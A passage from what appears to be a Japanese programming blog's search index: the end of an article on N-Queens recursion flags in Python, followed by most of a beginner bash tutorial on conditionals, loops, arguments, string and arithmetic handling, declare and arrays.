の判定で\nFA[0]は1ですので443行目から446行目の処理には入らず次のfor文に移動することになります。\nこの443,444,446行目の処理によってすでに同じ列にクイーンを置いている場合は下の行に行くのをやめるという動きを実現しています。\n446行目でFA[i]=0 という処理があります。\nこの処理は再帰の動きを理解する上で非常に重要な処理になります。\n再帰から戻ってきた時は445行目の下からスタートすることになります。\n再帰から戻ってきた時は変数の状態を再帰に入る直前の状態に戻す必要があります。\nローカル変数については特別にプログラムしないでも再帰前の状態に戻るのですが、グローバル変数は自分で設定しないと元に戻りません。\n再帰から戻ってきた時はiにクイーンを置かなかったことになるのですから\nFA[i]=0で明示的にフラグを落としてあげています。\n今回は配置フラグの全体的な流れを説明しました。次回は図で説明しながら実際の動きを追ってみましょう。\n","date":"2022-02-03T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/","title":"第3回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（１）"},{"content":"この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。\n過去、bashの経験があり、久しぶりにbashを書く必要に迫られた人、他の言語でプログラム経験があり、bash独自の書き方をざっくりと思い出したい人は、このトピックを長め読むだけで、充分 bashを思い出せるはずです。\nこのトピックをざっくり読み流すとおよそ４５分でbashの構文を網羅的に理解することができます。\nでは次のトピックについて説明します。\nはじめてのシェルスクリプト このトピックでは、catコマンドでシェルの場所を確認後、スクリプトファイルの作成、echoコマンドを使用して「Hello,shellscript.」記述し、スクリプトファイルを実行可能にします。\nではまず、ターミナルに次のコマンドを入力します。\n$ cat /etc/shells 実行するとおおよそ次の出力となります。\n$ cat /etc/shells\n/bin/sh\n/bin/bash\n/sbin/nologin\n/usr/bin/sh\n/usr/bin/bash\n/usr/sbin/nologin\n$\nこのコマンドは、システムで利用可能なすべてのシェルを表示し、それらのいずれかを使用できます。\nこのタスクでシステムにbashシェルがあるかどうかを確認できました。bashのパスを知るには、ターミナルで「$ which bash」を実行します。\n$ which bash /usr/bin/bash $ ヒント このパスをシェバンといいます。シェルスクリプトを実行する「bash」のPATHは「/usr/bin/bash」であることがわかりました。このシェバンを、すべてのシェルスクリプトのページ先頭に書き込む必要があります。 シェバンをソースファイルの先頭行に書きます。\n#!/usr/bin/bash ではさっそく「helloScript.sh」ファイルに「Hello,shellscript.」を記述しましょう。内容は以下の通りです。\n#!/bin/bash echo \u0026#34;Hello,shellscript.\u0026#34;; ファイルを保存し、ターミナルに戻り、「ls」コマンドを実行してファイルの存在を確認します。「ls -la」を使用してファイルの詳細を取得することもできます。\nその結果は、次のようになります。\n$ ls helloScript.sh $ $ ls -la -rw-rw-r-- 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh $ \u0026lsquo;rw-rw-r\u0026rsquo; は、ファイルの所有者が、ファイへの読み取り、および書き込み権限を持っていることを示します。\n読むことができる (Readable)\tr\t4\n書くことができる (Writable)\tw\t2\n実行することができる (eXecutable)\tx\t1\nなにもできない\t-\t0\n３つのブロックにわかれているのは、グループを示しています。\n自分 グループ\t他人\nxrw xrw xrw\n現在のhelloScript.shは -rw ですから、読むことと、書くことはできるものの、実行する権限がないようです。\nこのスクリプトを実行可能にするには、ターミナルで次のコマンドを実行する必要があります。\n$ chmod +x helloScript.sh 次に、「ls -la」コマンドを使用して「helloScript.sh」ファイルのアクセス許可を確認し、次の出力が得られます。\n$ ls -la -rwxrwxr-x 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh $ 実行権限が付きました。\n次に、ターミナルのコマンド「$ bash /helloScript.sh」を使用してファイルを実行します。\n$ ./helloScript.sh Hello, shell script. $ ヒント ファイルの実行方法はざっくりと２種類あります。 $ chmod +x \u0026lt;ファイル名\u0026gt; で、実行権限を与えたうえで、 $ ./\u0026lt;ファイル名\u0026gt; とする方法。 ファイルに実行権限を与えずに\n$ bash \u0026lt;ファイル名\u0026gt; と、する方法です。 セキュリティ的には後者が望ましいです。\n理由は、悪意を持つ第三者、または誤操作によってスクリプトファイルが簡単に実行できてしまう環境を作るべきではないからです。 何のファイルかわかりもせずに　$ ./\u0026lt;ファイル名\u0026gt; で実行できてしまうのは恐怖です。 実行する場合、ソースの中身を確認するのはもちろんですが、実行権限を軽率に与えることは控えましょう。 ファイルへの出力 このトピックでは、シェルスクリプトの実行結果を、別のファイルに出力する方法を紹介します。「helloScript.sh」の echo 行の末尾に少し追記するだけです。\n#!/bin/bash echo \u0026#34;Hello, shell script.\u0026#34; \u0026gt; hello.txt; ファイルを保存し、「$ bash helloScript.sh」でスクリプトを実行します。\n次の出力が表示されます。「ls -la」を押して、新しいファイルが存在することを確認してください。\n$ ls -la helloScript.sh hello.txt $ ヒント 「\u0026gt;」をリダイレクトと言います。 ファイルの出力は２種類あります。\nリダイレクト出力は、新規に空のファイルを作成したうえで文字を出力します。\nもう一つの出力方法は「アペンド \u0026raquo; 」です。\nアペンドは、既に存在するファイルに追記します。\n追記方法は簡単で、\u0026raquo; を使うだけです。\n#!/bin/bash echo \u0026#34;Hello, shell script.\u0026#34; \u0026gt; hello.txt; echo \u0026#34;and bash.\u0026#34; \u0026gt;\u0026gt; hello.txt; # ここで追記 ヒント 「\u0026raquo;」をアペンドと言います。 アペンドするときの注意点は、アペンドする場合は、既にファイルが存在している必要があります。「touch」コマンドでファイルを生成したうえでアペンドするか、あらかじめ「\u0026gt; リダイレクト」でファイルを生成し、文字列を追記したうえで、「\u0026raquo; アペンド」します。 コメント コメントはスクリプトの実行時に無視されます。スクリプトでは、コメントは何もしません。コメントには３つの種類があります。\n1行のコメント\n複数行のコメント\nHereDoc Delimeter\n1行のコメントの場合、コメントステートメントの前に「#」記号を半角で書きます。\n#!/bin/bash # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt; コメントを複数行にわたって書きたいことがあります。行頭に「# 」を書けばよいのですが、改行の度に行頭に「# 」を挿入する必要があり、とっても面倒です。\nC 言語やJava、HTMLですらも複数行コメントがあるのに。。。\nシェルスクリプトにもあります。あるんです。みんな知らないだけです。\n最初のコメントの先頭の前に「: \u0026lsquo;」を置き、最後のコメントの後に「\u0026rsquo;」と書くことだけです。理解を深めるために、次のスクリプトを調べることができます。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; This is the segment of multi-line comments Through this script, you will learn How to do multi-line commenting \u0026#39; # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt 仰々しいマルチラインコメントもあります。\nこちらのマルチラインコメントが使われない理由は、これから紹介するヒアドキュメントの記述方法に似ていてまぎらわしいからです。\n#!/bin/bash # 仰々しいマルチラインコメント \u0026lt;\u0026lt;COMMENT your comment 1 comment 2 blah COMMENT # シンプルなマルチラインコメント : \u0026#39; This is the segment of multi-line comments Through this script, you will learn How to do multi-line commenting \u0026#39; # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt; ヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 ヒアドキュメントはとてもべんりな出力方法です。\nコメントではありませんが、上記のマルチラインコメントと似ているので、ここでご紹介します。\n通常、複数の行出力は以下のように記述します。\n#!/bin/bash touch file.txt; echo \u0026#34;Hello,shellscript 1.\u0026#34; \u0026gt;\u0026gt; file.txt; echo \u0026#34;Hello,shellscript 2.\u0026#34; \u0026gt;\u0026gt; file.txt; echo \u0026#34;Hello,shellscript 3.\u0026#34; \u0026gt;\u0026gt; file.txt; とっても面倒ですね。\nそこでヒアドキュメントの出番となります。ヒアドキュメントでは以下のように書くことができます。\n#!/bin/bash cat \u0026lt;\u0026lt; EOS Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. EOS スクリプトを実行すると、次の出力が表示されます。\n$ bash hereDocuments.sh Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. $ cat の後ろに 「 - ハイフン」を置くと、インデントが有効になります。\n#!/bin/bash cat \u0026lt;\u0026lt;-EOS Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. EOS スクリプトを実行すると、次の出力が表示されます。\n$ bash hereDocuments.sh Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. $ ヒント cat \u0026laquo;-EOS (-)ハイフンを置くtipsを忘れずに。 条件分岐 このトピックでは以下について説明します。\nifステートメント\nif-elseステートメント\nif-else ifステートメント\nAND演算子とOR演算子\nIfステートメント ifセグメントに条件を書き込むには、条件の前後に「[ ]」内に余分なものを与える必要があります。その後、条件コードを述べ、次の行に移動し、「その後」と書き、条件がtrueの場合に実行するコード行を述べます。最後に、ifステートメントを閉じるには「fi」を使用します。以下は、ifステートメントの構文を理解するスクリプトコードの例です。\nifステートメントには「[ ]」内に条件を書きます。\n「if」と 「[」の間には半角スペースが必要です。\nまた、「[」と条件文、条件文と「]」の間にも半角スペースが必要です。\nifの終わりには、「fi」で閉じる必要があります。\n#!/bin/bash count=10; if [ \u0026#34;$count\u0026#34; -eq 10 ]; then echo \u0026#34;the condition is true\u0026#34;; fi このスクリプトは変数「カウント」に「10」の値を割り当てます。\n「if」の条件「[ \u0026ldquo;$count\u0026rdquo; -eq 10 ]」は、count変数の値が10と「等しい」かどうかを確認する条件文です。\nこの条件がtrueで成立すると、処理は次のステートメントに移動します。\n最後の「fi」は、このif-statementブロックの終了を示すキーワードです。\n条件が成立しない場合、このプログラムには「else」ブロックがないため、何もしません。\n次のプログラムは条件が成立しない場合の処理となります。\n#!/bin/bash count=11; # COUNT は 11とする if [ \u0026#34;$count\u0026#34; -eq 10 ]; then echo \u0026#34;the condition is true\u0026#34;; else echo \u0026#34;the condition is false. count: $count\u0026#34;; fi このプログラムでは、「$count」変数は11の値で割り当てています。\nこの場合、ifブロックの条件が成立しないため、「if」セクション全体を無視して「else」ブロックに移動します。\n端末は、条件がfalseであるというステートメントと$countを表示します。\n条件を書くための別の形式もあります。\n「[ ]」を「(( ))」括弧に置き換え、それらの間に条件を書き込むだけです。\nC言語、Javaに慣れている人は、この記述方法のほうが直観的かもしれません。\nこの形式の例を次に示します。\n#!/bin/bash count=11; # COUNT は 11とする if ((count==10)); then echo \u0026#34;the condition is true\u0026#34;; else echo \u0026#34;the condition is false count: $count\u0026#34;; fi if-else ifステートメント スクリプトでif-else ifをステートメントのブロックとして使用すると、プログラムは条件を再チェックします。同様に、以下のサンプルコードを「helloScript.sh」に記述すると、プログラムは最初に「if」条件をチェックすることがわかります。「カウント」変数には「10」の値が割り当てられます。最初の「if」条件では、プログラムは「カウント」が9より大きい値を持っていることを確認します。その後、「if」ブロックに書かれたステートメントが実行され、そこから出てきます。たとえば、「elif」で書かれた条件がtrueの場合、プログラムは「elif」ブロックで書かれたステートメントのみを実行し、ステートメントの「if」および「else」ブロックを無視します。\n#!/bin/bash count=8; if ((count\u0026gt;9)); then echo \u0026#34;the first condition is true\u0026#34;; elif ((count\u0026lt;=9)); then echo \u0026#34;then second condition is true\u0026#34;; else echo \u0026#34;the condition is false\u0026#34;; fi AND演算子 条件で「AND」演算子を使用するには、条件間で記号「\u0026amp;\u0026amp;」を使用します。\nたとえば、「[ \u0026ldquo;$age\u0026rdquo; -gt 18 ] と [ \u0026ldquo;$age\u0026rdquo; -lt 40 ]をチェックし、年齢が18より大きく、年齢が40未満の場合、これはfalseであることがわかります。プログラムは「その後」の後に書かれたステートメントを無視し、端末に「年齢は正しくない」と印刷して「else」ブロックに向かって移動します\n#!/bin/bash age=10 if [ \u0026#34;$age\u0026#34; -gt 18 ] \u0026amp;\u0026amp; [ \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi 条件を次の形式で書くこともできます。\n#!/bin/bash age=30 if [[ \u0026#34;$age\u0026#34; -gt 18 \u0026amp;\u0026amp; \u0026#34;$age\u0026#34; -lt 40 ]] then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi 「\u0026amp;\u0026amp;」の代わりに「-a」を使用して、プログラムの条件でAND演算子を使用することもできます。それは同じように動作します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -gt 18 -a \u0026#34;$age\u0026#34; -lt 40 ] then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi このコードを「helloScript.sh」スクリプトに保存し、ターミナルから実行します\nOR演算子 2つの条件があり、それらのいずれかまたは両方がtrueの場合、前述のステートメントを実行する場合、OR演算子が使用されます。 「-o」はOR演算子を表すために使用されます。「||」記号を使用することもできます。\n次のサンプルコードを「helloScript.sh」に書き、ターミナルから実行して動作を確認します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -gt 18 -o \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi OR演算子をよりよく理解するために、さまざまな条件を試すこともできます。以下に４つのサンプルを記します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 -o \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 -o \u0026#34;$age\u0026#34; -gt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [[ \u0026#34;$age\u0026#34; -lt 18 || \u0026#34;$age\u0026#34; -gt 40 ]]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 ] || [ \u0026#34;$age\u0026#34; -gt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi ループ このトピックでは、以下の説明をします。\nwhileループ\nuntil ループ\nfor ループ\nbreak と continue\nwhileループ: ループは条件がtrueの場合にコードブロック(do\u0026hellip;doneで囲まれています)を実行し、条件がfalseになるまでそれを実行し続けます。\n条件がfalseになると、whileループは終了します。\nwhileループは、キーワード「while」から始まり、そのうしろに条件文を書きます。\n条件文を閉じたらキーワード「do」を使用し、プログラムの条件がtrueの場合に実行する処理ステートメントの束を書きます。\n処理ステートメントの終了後、キーワード「done」を書いてwhileループを閉じます。\n以下、スクリプトを「helloScript.sh」として保存します。\n#!/bin/bash number=1; while [ $number -lt 10 ]; do echo \u0026#34;$number\u0026#34;; number=$(( number+1 )); done ターミナルで「$ ./whileLoop.sh」コマンドを使用してスクリプトを実行ます。\n$ bash whileLoop.sh 1 2 3 4 5 6 7 8 9 $ Whileループでは、まず、条件が真かどうかをチェックします。\n条件がfalseの場合、ループから出てプログラムを終了します。\n条件が true の場合、実行シーケンスはキーワード \u0026lsquo;do\u0026rsquo; の後に書かれたステートメントに移動します。\n上記サンプルのは、「echo」により１から９までが出力されます。\nヒント ループ自体をループさせるincrementステートメントについて $(( )) は、括弧内で計算された値が引き出されます。 (( )) 内は、変数の冒頭に $ は必要ありません。 (( )) 内は、四則演算が可能です。スペースを空ける必要もありません。 until ループ: loopが条件がfalseのときにコードブロック(do\u0026hellip;doneで囲まれている)を実行し、条件がtrueになるまで実行し続けるまでループし続け、条件が true になると、until ループは終了します。\nuntilループの構文はwhileループの構文と同じで、「while」の代わりに「until」という言葉を使用します。\nターミナルで「$ ./untilLoop.sh」コマンドを使用してスクリプトを実行ます。\n#!/bin/bash number=1; until [ $number -ge 10 ]; do echo \u0026#34;$number\u0026#34;; number=$(( number+1 )); done 上記のコードを「untilLoop.sh」ファイルに保存します。コマンドを使って実行する\n$ bash untilLoop.sh 1 2 3 4 5 6 7 8 9 $ ヒント whileループは、条件が true の時に( do \u0026hellip;done) ブロックを実行し、条件が false になるとループを終了します。 untilループは、条件が false の時に( do \u0026hellip;done) ブロックを実行し、条件が true になるとループを終了します。 for ループ: forループは、繰り返し実行される条件を指定するループのタイプです。\nforループには、いくつかの記述方法があります。\n最初の方法として、反復用の数字を書きます。\n以下に示すコードでは、反復用の数字反復を制御する変数 \u0026lsquo;i\u0026rsquo; にさせます。\n以下のfor ループは 5 回実行されます。\nスクリプトファイル「helloScript.sh」にコードを保存します。\n#!/bin/bash for i in 1 2 3 4 5 ; do echo $i; done ターミナルで次のコマンドを入力して、「forLoop.sh」ファイルを実行します。\n$ bash forLoop.sh 1 2 3 4 5 $ この方法はシンプルに見えますが、1000回実行したい場合は、実行したい数値を列挙する必要があるため大変です。\n実は、1から1000までの反復回数を書く必要はなく、ループに他の書き方を使用します。\n以下のサンプルコード「for i in {0..10}」のように、反復の開始点と終了点を宣言します。\nこの書き方によってforループは10回実行されます。 \u0026lsquo;0\u0026rsquo; は開始点として定義され、\u0026lsquo;10\u0026rsquo; は反復の終了点として定義されます。\n#!/bin/bash for i in {0..10}; do echo $i; done ファイル「forLoop2.sh」にコードを保存します。ファイルを実行すると、次の出力が表示されます。\n$ bash forLoop2.sh 0 1 2 3 4 5 6 7 8 9 10 $ ループを制御する変数の増分値を定義することもできます。\nたとえば、「for i in {0..10..2}」では、\u0026lsquo;0\u0026rsquo; をループの開始点、\u0026lsquo;10\u0026rsquo; は終点、\u0026lsquo;2\u0026rsquo; はループは \u0026lsquo;i\u0026rsquo; 2の増分で、echo $i ステートメントを実行します。\nしたがって、以下に示す例では、プログラムはループの最初の実行で0を出力し、その後、「i」の値を２つずつインクリメントします。\nこのコードは、「i」の値を0,2,4,6,8,10として出力します。\n#!/bin/bash for i in {0..10..2}; do echo $i; done $ bash forLoop3.sh 0 2 4 6 8 10 $ 多くのプログラミング言語でおなじみ「for loop」書式の記述も可能です。\n以下のサンプルコードは、このメソッドを使用して「forループ」を書いています。\n\u0026lsquo;for (( i=0; i\u0026lt;5; i++ ))’ では、\u0026lsquo;i’ はループ全体を制御する変数です。\nまず、値 \u0026lsquo;i\u0026rsquo; は 値 \u0026lsquo;0\u0026rsquo; で初期化され、次にループ \u0026lsquo;i\u0026lt;5\u0026rsquo; の制御ステートメント、\u0026lsquo;i++\u0026rsquo; はループのたびに１つずつインクリメントする事をあわらします。\n#!/bin/bash for (( i=0; i\u0026lt;5; i++ )); do echo $i; done \u0026lsquo;i\u0026rsquo;は0で初期化され、\u0026lsquo;i\u0026rsquo;の値が5未満の条件をチェックします。\n最初条件の結果は \u0026rsquo;true\u0026rsquo; です。\n処理ステートメントに進み、、echo コマンドにより端末に「i」の値を「0」として出力します。\n処理が進むにつれ、値「i」が一つずつ増加します。\nプログラムは処理の中で、「i」の値が5未満であるかどうかを再度確認し、再び「i」の値(\u0026lsquo;1」を出力します。\nこの実行フローは、「i」の値が「5」の値に達するまで続き、「５」に達した段階ではforループをぬけてプログラムは終了します。\n$ bash increments.sh 0 1 2 3 4 $ breakとcontinue breakステートメントは、指定された条件でループを終了するために使用されます。\n以下に示すコードでは、for loopは if ステートメントの条件により、「i」の値が \u0026lsquo;5\u0026rsquo; になるまで通常の実行を行い、「i」が \u0026lsquo;5以上\u0026rsquo; ループを停止します。\n#!/bin/bash for (( i=0; i\u0026lt;=10; i++ )); do if [ $i -gt 5 ]; then break; fi echo $i; done スクリプトを保存し、ファイルを実行します。次の出力が得られます。\n$ bash break.sh 0 1 2 3 4 5 $ Continueステートメントは、breakステートメントとは対照的に機能します。\n条件が真である場合は反復をスキップ( continue )し、次の反復に向かって処理を進めます。\n以下のループは、\u0026lsquo;3\u0026rsquo; と \u0026lsquo;7\u0026rsquo; を除いて、\u0026lsquo;0\u0026rsquo; から \u0026lsquo;20\u0026rsquo; までの端末に \u0026lsquo;i\u0026rsquo; 変数の値を出力します。\nifステートメント \u0026lsquo;if [ $i -eq 3 ] || [ $i -eq 7 ]\u0026rsquo; は、\u0026lsquo;i\u0026rsquo; の値が 3 または 7 に等しいときは反復をスキップし、echoせずにforループの処理を進めます。\nこの概念をよりよく理解するために、次のコードを実行します。\n#!/bin/bash for (( i=0; i\u0026lt;=10; i++ )); do if [ $i -eq 3 ] || [ $i -eq 7 ]; then continue; fi echo $i; done $ bash continue.sh 0 1 2 4 5 6 8 9 10 $ 以下のように書くこともできます。こちらの記述のほうがすっきりしていて、Ｃ言語やＪａｖａに慣れ親しんでいる人は、直感的に理解できるかもしれません。\nfor (( i=0; i\u0026lt;=10; i++ )); do if (( i==3 || i==7 ));then continue; fi echo $i; done ヒント (( )) で囲む記述で書いていく方が良いかもしれません。 他の言語で慣れ親しんでいる書き方を踏襲することで、bash独特の書き方に振り回される事がないからです。 なにより、(( )) 内は、変数の冒頭に \u0026lsquo;$\u0026rsquo; が不要になるだけでも、コードが見やすくなります。 スクリプトへの値渡し「実行パラメータ」 このトピックの最初の例は、スクリプトを実行する際に、スクリプトへの入力として値を与えるための説明をします。\n#!/bin/bash echo $1 $2 $3; このコードは、端末に3つの値を出力します。\n上記のコードをスクリプト「input.sh」に保存します。実行時に実行ファイル名に続き、三つの値を指定して、スクリプトに値を渡します。\n$ bash input.sh BMW MERCEDES TOYOTA $ BMW MERCEDES TOYOTA $ スクリプト実行時に渡した３つの値はそれぞれコードの中で、「BMW」は「$1」、「MERCEDES」は「$2」、「TOYOTA」は「$3」に値は入力されます。\nechoステートメントに「$0」を指定すると、スクリプト名も出力されます。\n#!/bin/bash echo $0 $1 $2 $3; $ bash input2.sh BMW MERCEDES TOYOTA $ input2.sh BMW MERCEDES TOYOTA $ この目的のために配列を使用することもできます。\n配列を宣言するには、コード \u0026lsquo;args=(\u0026quot;$@\u0026quot;)\u0026rsquo; を使用します。\nこのコード \u0026lsquo;args\u0026rsquo; は配列の名前であり、\u0026rsquo;@\u0026rsquo; は無限の数の値を持つ可能性があることを表します。\nこのタイプの配列宣言は、入力のサイズがわからない場合に便利です。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;); echo ${args[0]} ${args[1]} ${args[2]}; BMW\u0026rsquo;は${args[0]}、「MERCEDES」は${args[1]}、「HONDA」は${args[2]}を表します。\n$ bash args.sh BMW MERCEDES TOYOTA $ BMW MERCEDES TOYOTA $ 以下に示すコードは、無限の数の値を持つ配列の値を出力できます。\n前の例では、使用されるコマンド \u0026rsquo;echo ${args[0]} ${args[1]} ${args[2]}は配列の最初の3つの値のみを出力しますが、今回のコードは、出力を指定することなく、渡された値の全てを出力します。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;) ; echo $@; $ bash args2.sh BMW MERCEDES TOYOTA BMW MERCEDES TOYOTA $ bash args2.sh BMW MERCEDES TOYOTA HONDA BMW MERCEDES TOYOTA HONDA $ \u0026rsquo;echo $#\u0026rsquo; と書いて配列サイズを出力することもできます。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;); echo $@; echo $#; $ bash args3.sh BMW MERCEDES TOYOTA BMW MERCEDES TOYOTA 3 $ bash args3.sh BMW MERCEDES TOYOTA HONDA BMW MERCEDES TOYOTA HONDA 4 $ 文字列処理 文字列の比較 このトピックでは、文字列の比較を紹介します。\nプログラムは、ユーザーから2つの文字列入力を受け取ります。\nプログラムはそれぞれの値を読みこみ、２つの異なる変数 \u0026lsquo;st1\u0026rsquo; \u0026lsquo;st2\u0026rsquo; に格納します。\n両方の変数の値を比較するには、「if」ステートメントを使用し、条件文に「==」演算子で、二つの文字列が等価であるかを判定します。\n「else」ステートメントは、「文字列が一致しない」場合の処理を記述し、\u0026lsquo;if\u0026rsquo; ステートメントを閉じます。\n以下は、この手順全体のスクリプトコードです。\n#!/bin/bash echo \u0026#34;enter Ist string\u0026#34;; read st1; echo \u0026#34;enter 2nd string\u0026#34;; read st2; if [ \u0026#34;$st1\u0026#34; == \u0026#34;$st2\u0026#34; ]; then echo \u0026#34;strings match\u0026#34;; else echo \u0026#34;strings don\u0026#39;t match\u0026#34;; fi スクリプトを「string.sh」に保存します。ターミナルからファイルを実行し、比較のために2つの文字列を与えます。異なる入力を使用してコードをテストすることもできます。\n$ bash string.sh enter Ist string BMW enter 2nd string BMW strings match $ $ bash string.sh enter Ist string BMW enter 2nd string HONDA strings don\u0026#39;t match $ ヒント 文字列の比較は == です。 数値の比較は -eq -gt -lt -ge です。 -eq は[ == ] equals -gt は[ \u0026gt; ]greater than -lt は[ \u0026lt; ] less than -ge は[ \u0026gt;= ] greater equals です。 連結 2つの文字列を連結することもできます。\nプルグラムはユーザーへ入力を促し、２つの変数を \u0026lsquo;st1\u0026rsquo; \u0026lsquo;st2\u0026rsquo; 変数に格納します。\n#!/bin/bash echo \u0026#34;enter 1st string\u0026#34;; read st1; echo \u0026#34;enter 2nd string\u0026#34;; read st2; st3=\u0026#34;$st1 $st2\u0026#34;; echo $st3; このコードを「connect.sh」に保存し、端末を使用してファイルを実行し、結果を確認します。\n$ bash connect.sh enter 1st string BMW enter 2nd string HONDA BMW HONDA $ ヒント 文字列の結合時にそれぞれの変数の間に空白を起きたい場合は、以下のように二つの変数を「\u0026quot; \u0026ldquo;」ダブるクォーテーションで囲みます。 st3=\u0026quot;$st1 $st2\u0026rdquo;; 文字列を扱う場合、日頃から変数はダブルクォーテーションで囲む癖をつけておくべきです。\n変数への代入が「空（くうはく）」だった場合に、プログラムがバグにより停止します。 これは、文字列を扱う変数に限らず、次章で紹介する数値を格納する変数でも同じです。\n変数はつねに \u0026quot; \u0026quot; ダブルクオーテーションで囲みましょう。 数値計算処理 このトピックでは、スクリプトを使用してさまざまな数値演算を実行する方法を学習します。\n最初の方法では、２つの変数を値で定義し、echoステートメントと「+」演算子を使用してこれらの変数の合計を出力します。\n#!/bin/bash n1=4; n2=20; echo $(( n1 + n2 )); $ bash numberCalc.sh 24 $ 四則演算 加算、減算、乗算、除算などの複数の操作を実行するための単一のスクリプトを書くこともできます。\n#!/bin/bash n1=20; n2=4; echo $(( n1 + n2 )); echo $(( n1 - n2 )); echo $(( n1 * n2 )); echo $(( n1 / n2 )); echo $(( n1 % n2 )); $ bash numberCalc2.sh 24 16 80 5 0 $ 算術演算 exprコマンド 算術演算を実行する他の方法は、「expr」コマンドを使用することです。\nこの「expr」は、これらのn1とn2を他の変数とみなし、操作を実行することです。\n#!/bin/bash n1=20; n2=4; echo $(expr $n1 + $n2 ); $ bash numberCalc3.sh 24 $ 「expr」を使用して四則演算を処理してみます。\n#!/bin/bash n1=20; n2=4; echo $(expr $n1 + $n2 ); echo $(expr $n1 - $n2 ); echo $(expr $n1 \\* $n2 ); echo $(expr $n1 / $n2 ); echo $(expr $n1 % $n2 ); $ bash numberCalc4.sh 24 16 80 5 0 $ 小数点の扱い bcコマンド exprコマンドなどは小数演算できません。\nechoコマンドで数式を作成し、それをbcコマンドに渡して計算します。\n#!/bin/bash RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; $ bash bc.sh 3.33333 $ bcコマンドでの小数点以下の指定桁数出力 演算の精度を保つため、上記のように計算は小数点以下5桁で行うけれど、表示は小数点以下2桁とかにしたい場合（桁数を指定したい場合）\n#!/bin/bash RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc` printf \u0026#34;%.2f\u0026#34; $RESULT $ bash bc_f.sh 3.33 $ printf で桁数を指定します。\n実は、bcコマンドでも桁数を指定できます。\n#!/bin/bash # 先に紹介した方法 RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; # printfコマンドで２桁にする RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; printf \u0026#34;%.2f\\n\u0026#34; \u0026#34;$RESULT\u0026#34;; # bcコマンドで２桁にする RESULT=`echo \u0026#34;scale=2; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; $ bash bc_f.sh 3.33333 3.33 3.33 $ ヒント bcコマンドで小数点以下の桁数を指定するためには、scale= で指定します。 \u0026lsquo;;\u0026lsquo;セミコロンを忘れずに。 declareコマンド bashには変数の型(int char stringなど）がないため、bashで変数の型を制限することはできません。\nただし、型のような動作を許可することができます。\ndeclare [オプション] [変数名]=[値] グローバル変数とローカル変数 関数内で declare コマンドを使用すると、オプションがなければローカル変数として定義されます。-g オプションを使用すればスクリプト内のグローバルに変数を定義されます。スコープを明示しないと狭いスコープとなります。\n#!/bin/bash function set_my_value() { declare -x my_env_value=\u0026#39;ENV\u0026#39;; declare -g my_global_value=\u0026#39;GLOBAL\u0026#39;; declare my_local_value=\u0026#39;LOCAL\u0026#39;; my_value=\u0026#39;XXX\u0026#39;; } set_my_value; echo $my_env_value; echo $my_global_value; echo $my_local_value; echo $my_value; 結果は以下の通りです。\n$ bash declare.sh GLOBAL XXX $ 整数として変数定義する -i を付ければ整数として変数を定義できます。\n#!/bin/bash # -i で整数として変数を定義 $ declare -i num=001 $ echo $num $ bash declare_i.sh 1 $ # -i がないと文字列となるのでそのまま $ declare str=001 $ decho $str $ echo $str $ bash declare_no_i.sh 001 $ オプションまとめ delcare -a: 配列を定義 delcare -i: 整数として定義 delcare -r: 読み取り専用変数として定義 delcare -g: 関数内で使用時、グローバル変数として定義 配列 配列を宣言し、その中に値を格納する方法を学びます。\n好きなだけ値を保存できます。\n配列の名前を書き、その値を「( )」括弧で定義します。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; $ bash array.sh BMW TOYOTA HONDA $ 